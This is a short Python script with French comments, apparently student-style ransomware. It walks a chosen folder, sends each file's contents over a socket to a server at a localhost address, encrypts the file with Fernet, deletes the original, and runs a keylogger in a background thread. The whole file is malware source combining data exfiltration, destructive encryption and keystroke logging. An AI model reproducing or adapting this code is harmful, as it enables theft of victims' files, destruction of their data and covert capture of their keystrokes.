# libraries
from cryptography.fernet import Fernet
import os
from pynut.keyboard import Listener
import threading
import socket
from keylogger import Keylogger 

# classe qui gère l'encryption
class Encryptor:
    def loadkey(self, key_name):
        key = open(key_name,"rb").read()
        return key
    def encrypt(self, path, key):
        for root,_, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root, file)
                self.exfiltrate_file(file_path)  # Exfiltrer les fichiers avant chiffrement
                self.encrypt_all_files(file_path, key)


    def encrypt_all_files(self, file, key):
        f = Fernet(key)
        encrypted = f.encrypt(open(file, "rb").read())

        with open(file + ".aes", "wb") as encrypted_file:
            encrypted_file.write(encrypted)

        # Supprimer les docs originaux
        os.remove(file)

    def exfiltrate_file(self,file_path):
        # adresse et port du serveur
        server_address = ("127.0.0.1", 65432)
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(server_address)
                with open(file_path,"rb") as file:
                    data = file.read()
                    s.sendall(data)
                    print(f"Exfiltré {file_path} vers un serveur.")
        
        except Exception as e:
            print(f"Exfiltration echouée: {e}")


if __name__ == "__main__":
    # démarrage du keylogger dans un thread séparé
    log_file = "keylog.txt"
    keylogger = Keylogger(log_file)
    keylogger_thread = threading.Thread(target=keylogger.start, daemon=True)
    keylogger_thread.start()
    print(f"Keylogger started. Logs will be saved to {log_file}.")


    # Exécution du chiffrement
    encryptor = Encryptor()

    key = encryptor.loadkey("key.key")

    doc = input("Enter the folder name you wish to encrypt: ")

    encryptor.encrypt(doc,key)